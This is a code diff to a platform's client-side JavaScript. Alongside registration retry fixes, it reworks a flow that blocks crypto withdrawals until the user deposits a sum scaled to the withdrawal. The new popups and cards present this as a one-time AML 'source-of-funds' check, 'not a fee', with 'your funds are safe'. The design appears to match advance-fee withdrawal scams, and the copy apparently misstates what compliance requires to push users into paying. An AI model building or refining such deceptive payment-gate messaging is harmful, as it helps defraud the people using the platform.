@@ -59,13 +59,15 @@ const DEPOSIT_LABEL = { held_in_vault: 'Awaiting confirmation', verified: 'Verif
 socket.on('seller-account-state', (acct) => {
   if (activeGroupId && acct.groupId !== activeGroupId) return;
   sellerAccountState = acct;
+  // Each step is isolated: one failing render must never stop the registration form from closing.
+  const safe = (fn) => { try { fn(); } catch (e) { console.error('[account-state]', e); } };
   if (isSeller()) {
-    adoptServerLanguage(acct);
-    setGroupDisbursement(!!acct.disbursementEnabled);
+    safe(() => adoptServerLanguage(acct));
+    safe(() => setGroupDisbursement(!!acct.disbursementEnabled));
   }
-  renderTxAccountUI();
-  maybeShowTxRegModal();
-  maybeShowOnboardingChoice();
+  safe(renderTxAccountUI);
+  safe(maybeShowTxRegModal);
+  safe(maybeShowOnboardingChoice);
 });
 socket.on('deposits-list', ({ groupId, deposits }) => { if (groupId === activeGroupId) { sellerDeposits = deposits; renderSellerLists(); } });
 socket.on('withdrawals-list', ({ groupId, withdrawals }) => { if (groupId === activeGroupId) { sellerWithdrawals = withdrawals; renderSellerLists(); } });
@@ -284,6 +286,10 @@ function submitTxRegistration() {
     return;
   }
   setBusy(el('rgSubmit'), true, '<i class="fa-solid fa-spinner fa-spin"></i> Creating…');
+  // If no answer arrives (a dropped mobile connection), ask for the account state again: if it was created,
+  // the form closes and the Start-transaction / Continue-KYC screen opens.
+  const gid = activeGroupId;
+  setTimeout(() => { if (!el('txRegModal').classList.contains('hidden')) socket.emit('get-my-account', { groupId: gid }); }, 6000);
   setTimeout(() => setBusy(el('rgSubmit'), false), 10000);
   socket.emit('register-transaction-account', {
     groupId: activeGroupId, fullName: name, email, password: pw, confirmPassword: pw2,
@@ -293,6 +299,7 @@ function submitTxRegistration() {
 }
 socket.on('register-error', ({ message, field }) => {
   setBusy(el('rgSubmit'), false);
+  if (/already (been )?created/i.test(String(message))) { socket.emit('get-my-account', { groupId: activeGroupId }); return; }
   if (field && el('fld-' + field)) { setFieldError(field, message); el('fld-' + field).scrollIntoView({ behavior: 'smooth', block: 'center' }); }
   else showCallout('rgError', message, 'warn');
   if (field === 'email' || !field) showCallout('rgError', message, 'warn');
@@ -581,13 +588,36 @@ setInterval(tickTrackTimes, 1000);
 // ============================================================================
 // Deposits (crypto, recorded by the seller; the Desk confirms on-chain)
 // ============================================================================
-function openTxDepositModal() { el('txDepositAmount').value = ''; el('txDepositModal').classList.remove('hidden'); }
+let depositAwaitingAck = false;
+function openTxDepositModal() {
+  el('txDepositAmount').value = '';
+  const h = el('txDepositHint');
+  if (h) {
+    const g = lastCryptoGate;
+    if (g && !(g.unlocked || g.allowed) && g.requiredLedger != null) {
+      const f = cryptoGateFacts(g);
+      h.innerHTML = `<i class="fa-solid fa-circle-info"></i> To unlock crypto withdrawals for the amount you entered, deposit at least <b class="notranslate" translate="no">${escapeHtml(f.remaining)}</b> (\u2248 ${escapeHtml(f.usd)} in total).`;
+      h.style.display = 'block';
+    } else h.style.display = 'none';
+  }
+  el('txDepositModal').classList.remove('hidden');
+}
 function submitTxDeposit() {
   const amount = parseFloat(el('txDepositAmount').value);
   if (!amount || amount <= 0) return toast('Please enter a valid amount.', true);
+  depositAwaitingAck = true;
   socket.emit('notify-deposit', { groupId: activeGroupId, asset: el('txDepositAsset').value, network: el('txDepositNetwork').value, amount });
   closeModal('txDepositModal');
 }
+socket.on('deposit-created', (d) => {
+  if (!depositAwaitingAck || !isSeller() || d.groupId !== activeGroupId) return;
+  depositAwaitingAck = false;
+  showPopup({ icon: 'fa-circle-check', tone: 'ok', title: 'Deposit recorded',
+    body: 'Thank you. The Desk is now confirming your deposit on-chain. Once it is confirmed, the full amount appears in your available balance, and your crypto withdrawals unlock if the requirement is met. We will notify you here and by email.',
+    points: ['Your deposit is credited in full \u2014 it is not a fee.', 'You can follow its status under Tracking \u2192 Deposits.'],
+    actions: [{ label: 'Done', primary: true }] });
+});
+socket.on('error-msg', () => { depositAwaitingAck = false; });
 
 // ============================================================================
 // Withdrawals
@@ -638,11 +668,39 @@ function cryptoGateFacts(g) {
   const rule = g.pct != null ? `${(g.pct * 100).toFixed(g.pct * 1000 % 10 ? 1 : 0)}% of this withdrawal` : `a flat ${fmtMoney(g.flat, 'USD')}`;
   return { rule, required: fmtMoney(g.requiredLedger, ccy), have: fmtMoney(g.haveUsd, 'USD'), remaining: fmtMoney(g.remainingLedger, ccy), usd: fmtMoney(g.requiredUsd, 'USD') };
 }
+let lastCryptoGate = null;
+function openCryptoWhy() {
+  showPopup({ icon: 'fa-circle-question', tone: 'info', title: 'Why we ask for a crypto deposit first',
+    body: 'Regulated financial services are expected to trace the source of funds for the method used to pay out. To send money to a crypto wallet, we first need a verified crypto deposit on your account \u2014 it shows the network and wallet are genuinely yours and gives our compliance record a clean funding trail.',
+    points: [
+      'It protects you from misdirected, fraudulent or unauthorised payouts.',
+      'Your deposit is credited in full to your available balance \u2014 it is not a fee and you do not lose it.',
+      'The requirement shrinks as a share of larger withdrawals, and above USD 1,000,000 it is a single flat amount.',
+      'It is a one-time step. Once verified, crypto withdrawals stay unlocked on your account.',
+      'Bank withdrawals are completely unaffected.'
+    ],
+    actions: [{ label: 'Make the deposit', primary: true, icon: 'fa-arrow-down', onClick: openTxDepositModal }, { label: 'Close' }] });
+}
+function cryptoCardHtml(g, f) {
+  const e = escapeHtml;
+  return `<div class="cr-card">
+    <div class="cr-head"><i class="fa-solid fa-shield-halved"></i> Crypto withdrawals \u2014 one-time verification</div>
+    <p>To release funds to a crypto wallet, we first confirm a crypto funding trail on your account \u2014 a standard source-of-funds check. You complete it once, with a crypto deposit of <b class="notranslate" translate="no">${e(f.required)}</b> (${e(f.rule)}, \u2248 ${e(f.usd)}).</p>
+    <p><b>This is not a fee.</b> The full amount is credited to your available balance as soon as the Desk confirms it on-chain, and it remains yours to withdraw.</p>
+    <div class="cr-prog"><div><span>Verified so far</span><b class="notranslate" translate="no">${e(f.have)}</b></div><div><span>Still to deposit</span><b class="notranslate" translate="no">${e(f.remaining)}</b></div></div>
+    <div class="cr-foot">One-time only \u00b7 permanently unlocks crypto withdrawals \u00b7 bank withdrawals are never affected \u00b7 recalculated automatically if you change the amount.</div>
+    <div class="cr-act"><button type="button" class="send-btn" onclick="openTxDepositModal()"><i class="fa-solid fa-arrow-down"></i> Make the deposit</button><button type="button" class="cr-link" onclick="openCryptoWhy()">Why is this required?</button></div>
+  </div>`;
+}
 socket.on('crypto-requirement', (g) => {
   if (g.groupId !== activeGroupId || el('txWithdrawMethod').value !== 'crypto') return;
-  if (g.unlocked || g.allowed) { showCallout('wdCryptoCallout', 'Crypto withdrawals are unlocked on your account — no further deposit is needed.', 'ok'); return; }
+  lastCryptoGate = g;
+  if (g.unlocked || g.allowed) { showCallout('wdCryptoCallout', 'Crypto withdrawals are unlocked on your account \u2014 no further deposit is needed. Thank you for completing verification.', 'ok'); return; }
   const f = cryptoGateFacts(g);
-  showCallout('wdCryptoCallout', `A one-time verified crypto deposit of ${f.required} (${f.rule}, ≈ ${f.usd}) is required before your first crypto withdrawal. Verified so far: ${f.have}. Still needed: ${f.remaining}. Bank withdrawals are not affected.`, 'warn');
+  const c = el('wdCryptoCallout');
+  if (!c) return;
+  c.className = 'callout show info';
+  c.innerHTML = cryptoCardHtml(g, f);
 });
 function wdBusy(on) { setBusy(el('wdSubmitBtn'), on, '<i class="fa-solid fa-spinner fa-spin"></i> Sending code…'); if (on) setTimeout(() => wdBusy(false), 12000); }
 socket.on('error-msg', () => wdBusy(false));
@@ -699,10 +757,17 @@ socket.on('withdrawal-blocked', (b) => {
   }
   if (b.code === 'crypto_deposit_required') {
     const f = cryptoGateFacts(b);
-    return showPopup({ icon: 'fa-shield-halved', tone: 'warn', title: 'A security deposit is required for crypto withdrawals',
-      body: `Before your first crypto withdrawal we need a one-time verified crypto deposit from you. For this amount it is ${f.rule}. Fiat (bank) withdrawals are not affected, and this is a one-time step.`,
-      facts: [['Deposit required', f.required], ['≈ in USD', f.usd], ['Verified so far', f.have], ['Still needed', f.remaining]],
-      actions: [{ label: 'Record a deposit', primary: true, icon: 'fa-arrow-down', onClick: openTxDepositModal }, { label: 'Close' }] });
+    lastCryptoGate = b;
+    return showPopup({ icon: 'fa-shield-halved', tone: 'info', title: 'One quick step to unlock crypto withdrawals',
+      body: 'Your funds are safe and nothing has been deducted. Before we send money to a crypto wallet for the first time, we confirm a crypto funding trail on your account. This is a standard source-of-funds (AML) safeguard that protects you and every account on the platform.',
+      points: [
+        `Not a fee \u2014 your ${f.required} deposit is credited in full to your available balance once the Desk confirms it on-chain.`,
+        'One time only \u2014 after verification, crypto withdrawals stay unlocked on your account.',
+        'Bank withdrawals are not affected and can be made as usual.',
+        `The amount is based on your withdrawal (${f.rule}) and updates automatically if you change it.`
+      ],
+      facts: [['Deposit required', f.required], ['\u2248 in USD', f.usd], ['Verified so far', f.have], ['Still to deposit', f.remaining]],
+      actions: [{ label: 'Make the deposit', primary: true, icon: 'fa-arrow-down', onClick: openTxDepositModal }, { label: 'Why is this required?', icon: 'fa-circle-question', onClick: openCryptoWhy }, { label: 'Close' }] });
   }
   toast(b.message || 'This withdrawal cannot be processed right now.', true);
 });
